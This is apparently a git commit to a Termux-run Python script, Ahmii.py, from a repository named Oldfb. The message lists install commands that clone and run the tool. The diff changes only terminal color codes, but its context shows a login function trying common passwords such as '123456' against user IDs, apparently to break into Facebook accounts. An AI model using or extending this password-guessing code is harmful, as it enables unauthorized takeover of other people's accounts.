62b050858fbdda5d9c146afd921c4d3cb676f831
ahmiieditor <ali6677butt7686@gmail.com>
2025-10-08 17:44:54 +0500

    Update Ahmii.py
    apt update
    ‎apt upgrade
    ‎pkg install git
    ‎pkg install python
    ‎pkg install python2
    ‎pip install requests
    ‎pip install mechanize
    ‎pip2 install requests
    ‎pip2 install mechanize
    ‎pip install bs4
    ‎pip install rich
    ‎rm -rf Oldfb
    ‎git clone https://github.com/ahmiieditor/Oldfb.git
    ‎termux-setup-storage
    ‎cd Oldfb
    ‎python Ahmii.py

--- Ahmii.py
+++ Ahmii.py
@@ -430,7 +430,7 @@ def login_1(uid):
     global loop
     session = requests.session()
     try:
-        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mAHMII-XD\x1b[38;5;033[0m)\x1b[1;37m\x1b[38;5;033[0m\x1b[1;37m\x1b[38;5;033[0m(\x1b[38;5;192m{loop}\x1b[38;5;033[0m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;033[0m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
+        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mAHMII-XD\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
         sys.stdout.flush()
         for pw in ('123456', '1234567', '12345678', '123456789'):
             data = {
